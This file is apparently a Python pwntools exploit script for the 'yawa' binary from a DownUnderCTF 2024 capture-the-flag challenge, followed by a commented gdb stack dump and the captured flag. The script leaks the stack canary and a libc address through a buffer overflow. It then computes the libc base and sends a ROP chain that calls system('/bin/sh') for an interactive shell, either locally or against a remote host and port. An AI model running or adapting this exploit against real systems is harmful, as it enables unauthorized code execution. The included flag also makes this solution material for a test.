
from pwn import *
if args.REMOTE:
    io = remote(sys.argv[1],sys.argv[2])
else:
    io = process("./yawa_patched", )
elf = context.binary = ELF("./yawa_patched", checksec=False)

libc = ELF('./libc.so.6')

# 0x7fffffffdce8 last in stack can reach

context.log_level = 'info'
offset_canary = 88
offset_to_return = 104


io.recvuntil(b'> ')
io.sendline(b'1')
pause()
info('Leaking Canary')
payload = 'A'*88
io.sendline(payload)
io.recvuntil(b'> ')
io.sendline(b'2')
print(io.recvline())
canary = u64(b'\x00' + io.recv(7))
print(hex(canary))



io.recvuntil(b'> ')
io.sendline(b'1')
payload= 'A'*103 
info('Leaking LibC Address')
io.sendline(payload)
io.recvuntil(b'> ')
io.sendline(b'2')
io.recvline()
libc_addr = unpack(io.recv(6).ljust(8,b'\x00'))
print(f"libc_addr: {hex(libc_addr)}")
print(f"libc_start_main offset: {hex(libc.sym['__libc_start_main'])}")


base_address = libc_addr -0x29d90
libc.address = base_address
print(f"base_address: {hex(libc.address)}")
io.recvuntil(b'> ')
io.sendline(b'1')

rop =ROP(libc)
ret = libc.address + 0x00000000000f8c92
rop.system(next(libc.search(b'/bin/sh\x00')))

payload= b'A'*88 + p64(canary)

# offsets to rip = 104
payload+= b'A'*(104-len(payload))
payload += p64(ret)
payload += rop.chain()
io.sendline(payload)
io.sendline(b'100')
io.interactive()



'''

0f:0078│+008     0x7fffffffdcc8 —▸ 0x7ffff7c29d90 ◂— mov edi, eax

tele rsp 40
00:0000│ rsp 0x7fffffffdc50 ◂— 0x60 /* '`' */
01:0008│-068 0x7fffffffdc58 ◂— 0x0
02:0010│-060 0x7fffffffdc60 ◂— 0x1
03:0018│-058 0x7fffffffdc68 ◂— 0x0
... ↓        9 skipped
0d:0068│-008 0x7fffffffdcb8 ◂— 0xd8e176a3996f3400
0e:0070│ rbp 0x7fffffffdcc0 ◂— 0x1
0f:0078│+008 0x7fffffffdcc8 —▸ 0x7ffff7c29d90 ◂— mov edi, eax
10:0080│+010 0x7fffffffdcd0 ◂— 0x0
11:0088│+018 0x7fffffffdcd8 —▸ 0x5555555552b1 (main) ◂— endbr64 
12:0090│+020 0x7fffffffdce0 ◂— 0x100000000
13:0098│+028 0x7fffffffdce8 —▸ 0x7fffffffddd8 —▸ 0x7fffffffe15f ◂— '/home/gnapac/Desktop/CTF/ductf24/yawa/yawa_patched'
14:00a0│+030 0x7fffffffdcf0 ◂— 0x0
15:00a8│+038 0x7fffffffdcf8 ◂— 0xd63f22a7d407dbef
16:00b0│+040 0x7fffffffdd00 —▸ 0x7fffffffddd8 —▸ 0x7fffffffe15f ◂— '/home/gnapac/Desktop/CTF/ductf24/yawa/yawa_patched'
17:00b8│+048 0x7fffffffdd08 —▸ 0x5555555552b1 (main) ◂— endbr64 
18:00c0│+050 0x7fffffffdd10 —▸ 0x555555557d98 (__do_global_dtors_aux_fini_array_entry) —▸ 0x5555555551a0 (__do_global_dtors_aux) ◂— endbr64 
19:00c8│+058 0x7fffffffdd18 —▸ 0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
1a:00d0│+060 0x7fffffffdd20 ◂— 0x29c0dd586da5dbef
1b:00d8│+068 0x7fffffffdd28 ◂— 0x29c0cd22ee8ddbef
1c:00e0│+070 0x7fffffffdd30 ◂— 0x7fff00000000
1d:00e8│+078 0x7fffffffdd38 ◂— 0x0
... ↓        3 skipped
21:0108│+098 0x7fffffffdd58 ◂— 0xd8e176a3996f3400
22:0110│+0a0 0x7fffffffdd60 ◂— 0x0
23:0118│+0a8 0x7fffffffdd68 —▸ 0x7ffff7c29e40 (__libc_start_main+128) ◂— mov r15, qword ptr [rip + 0x1f0159]
24:0120│+0b0 0x7fffffffdd70 —▸ 0x7fffffffdde8 —▸ 0x7fffffffe192 ◂— 'SHELL=/bin/bash'
25:0128│+0b8 0x7fffffffdd78 —▸ 0x555555557d98 (__do_global_dtors_aux_fini_array_entry) —▸ 0x5555555551a0 (__do_global_dtors_aux) ◂— endbr64 
26:0130│+0c0 0x7fffffffdd80 —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
27:0138│+0c8 0x7fffffffdd88 ◂— 0x0

DUCTF{Hello,AAAAAAAAAAAAAAAAAAAAAAAAA}

'''